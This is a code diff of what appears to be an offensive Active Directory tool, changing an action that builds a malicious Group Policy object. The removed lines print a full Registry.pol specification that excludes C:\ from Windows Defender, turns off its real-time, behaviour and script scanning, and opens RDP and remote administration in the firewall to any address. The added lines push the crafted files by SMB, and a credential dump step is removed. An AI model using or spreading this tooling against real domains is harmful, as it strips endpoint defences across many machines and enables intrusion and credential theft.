@@ -924,120 +924,11 @@ class x_GPODisableDefender(Action):
             '- Enable RDP',
             '- Disable Firewall',
         ]
-        print_comment(comment)
-
-        print('echo 77u/PD94bWwgdmVyc2lvbj0nMS4wJyBlbmNvZGluZz0ndXRmLTgnPz4NCjxwb2xpY3lDb21tZW50cyB4bWxuczp4c2Q9Imh0dHA6Ly93d3cudzMub3JnLzIwMDEvWE1MU2NoZW1hIiB4bWxuczp4c2k9Imh0dHA6Ly93d3cudzMub3JnLzIwMDEvWE1MU2NoZW1hLWluc3RhbmNlIiByZXZpc2lvbj0iMS4wIiBzY2hlbWFWZXJzaW9uPSIxLjAiIHhtbG5zPSJodHRwOi8vd3d3Lm1pY3Jvc29mdC5jb20vR3JvdXBQb2xpY3kvQ29tbWVudERlZmluaXRpb25zIj4NCiAgPHBvbGljeU5hbWVzcGFjZXM+DQogICAgPHVzaW5nIHByZWZpeD0ibnMwIiBuYW1lc3BhY2U9Ik1pY3Jvc29mdC5Qb2xpY2llcy5UZXJtaW5hbFNlcnZlciI+PC91c2luZz4NCiAgICA8dXNpbmcgcHJlZml4PSJuczEiIG5hbWVzcGFjZT0iTWljcm9zb2Z0LlBvbGljaWVzLldpbmRvd3NEZWZlbmRlciI+PC91c2luZz4NCiAgICA8dXNpbmcgcHJlZml4PSJuczIiIG5hbWVzcGFjZT0iTWljcm9zb2Z0LlBvbGljaWVzLldpbmRvd3NGaXJld2FsbCI+PC91c2luZz4NCiAgPC9wb2xpY3lOYW1lc3BhY2VzPg0KICA8Y29tbWVudHM+DQogICAgPGFkbVRlbXBsYXRlPjwvYWRtVGVtcGxhdGU+DQogIDwvY29tbWVudHM+DQogIDxyZXNvdXJjZXMgbWluUmVxdWlyZWRSZXZpc2lvbj0iMS4wIj4NCiAgICA8c3RyaW5nVGFibGU+PC9zdHJpbmdUYWJsZT4NCiAgPC9yZXNvdXJjZXM+DQo8L3BvbGljeUNvbW1lbnRzPg== | base64 -d >comment.cmtx')
-        print()
-
-        print("""cat pol.json
-[
-    {
-        "keyname": "SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\Exclusions",
-        "valuename": "Exclusions_Paths",
-        "data": 1,
-        "type": "REG_DWORD"
-    },
-    {
-        "keyname": "SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\Exclusions",
-        "valuename": "Exclusions_Processes",
-        "data": 1,
-        "type": "REG_DWORD"
-    },
-    {
-        "keyname": "SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\Exclusions\\\\Paths",
-        "valuename": "",
-        "data": "C:\\\\",
-        "type": "REG_SZ"
-    },
-    {
-        "keyname": "SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\Exclusions\\\\Processes",
-        "valuename": "desc",
-        "data": "C:\\\\mybin.exe",
-        "type": "REG_SZ"
-    },
-    {
-        "keyname": "SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\Real-Time Protection",
-        "valuename": "DisableRealtimeMonitoring",
-        "data": 1,
-        "type": "REG_DWORD"
-    },
-    {
-        "keyname": "SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\Real-Time Protection",
-        "valuename": "DisableBehaviorMonitoring",
-        "data": 1,
-        "type": "REG_DWORD"
-    },
-    {
-        "keyname": "SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\Real-Time Protection",
-        "valuename": "DisableScriptScanning",
-        "data": 1,
-        "type": "REG_DWORD"
-    },
-    {
-        "keyname": "SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\Real-Time Protection",
-        "valuename": "DisableOnAccessProtection",
-        "data": 1,
-        "type": "REG_DWORD"
-    },
-    {
-        "keyname": "SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\Real-Time Protection",
-        "valuename": "DisableScanOnRealtimeEnable",
-        "data": 1,
-        "type": "REG_DWORD"
-    },
-    {
-        "keyname": "SOFTWARE\\\\Policies\\\\Microsoft\\\\WindowsFirewall\\\\DomainProfile\\\\RemoteAdminSettings",
-        "valuename": "Enabled",
-        "data": 1,
-        "type": "REG_DWORD"
-    },
-    {
-        "keyname": "SOFTWARE\\\\Policies\\\\Microsoft\\\\WindowsFirewall\\\\DomainProfile\\\\RemoteAdminSettings",
-        "valuename": "RemoteAddresses",
-        "data": "",
-        "type": "REG_SZ"
-    },
-    {
-        "keyname": "SOFTWARE\\\\Policies\\\\Microsoft\\\\WindowsFirewall\\\\DomainProfile\\\\Services\\\\RemoteDesktop",
-        "valuename": "Enabled",
-        "data": 1,
-        "type": "REG_DWORD"
-    },
-    {
-        "keyname": "SOFTWARE\\\\Policies\\\\Microsoft\\\\WindowsFirewall\\\\DomainProfile\\\\Services\\\\RemoteDesktop",
-        "valuename": "RemoteAddresses",
-        "data": "",
-        "type": "REG_SZ"
-    },
-    {
-        "keyname": "SOFTWARE\\\\Policies\\\\Microsoft\\\\WindowsFirewall\\\\StandardProfile\\\\RemoteAdminSettings",
-        "valuename": "Enabled",
-        "data": 1,
-        "type": "REG_DWORD"
-    },
-    {
-        "keyname": "SOFTWARE\\\\Policies\\\\Microsoft\\\\WindowsFirewall\\\\StandardProfile\\\\RemoteAdminSettings",
-        "valuename": "RemoteAddresses",
-        "data": "",
-        "type": "REG_SZ"
-    },
-    {
-        "keyname": "SOFTWARE\\\\Policies\\\\Microsoft\\\\WindowsFirewall\\\\StandardProfile\\\\Services\\\\RemoteDesktop",
-        "valuename": "Enabled",
-        "data": 1,
-        "type": "REG_DWORD"
-    },
-    {
-        "keyname": "SOFTWARE\\\\Policies\\\\Microsoft\\\\WindowsFirewall\\\\StandardProfile\\\\Services\\\\RemoteDesktop",
-        "valuename": "RemoteAddresses",
-        "data": "",
-        "type": "REG_SZ"
-    }
-]
-""")
-        print()
-        print('./tools/readpol.py pol.json --save Registry.pol')
-        print()
+        cmd = [
+            './tools/readpol.py tools/pol.json --save Registry.pol',
+            'cp tools/comment.cmtx .',
+        ]
+        print_line(comment, cmd, v)
 
         pre_update_gpo(v, parent, target, gpo)
 
@@ -1046,6 +937,8 @@ class x_GPODisableDefender(Action):
         print_line(comment, cmd, v, end=False)
 
         print_cmd([
+            '## mv comment.cmtx __comment.cmtx',
+            '## mv Registry.pol __Registry.pol',
             '## get comment.cmtx',
             '## get Registry.pol',
             'put comment.cmtx',
@@ -1055,8 +948,6 @@ class x_GPODisableDefender(Action):
         print()
 
         post_update_gpo(v, parent, target, gpo, '[{35378EAC-683F-11D2-A89A-00C04FBBCFA2}{D02B1F72-3407-48AE-BA88-E8213C6761F1}]')
-
-        Secretsdump(glob, parent, target)
 
 
 class x_RegBackup(Action):
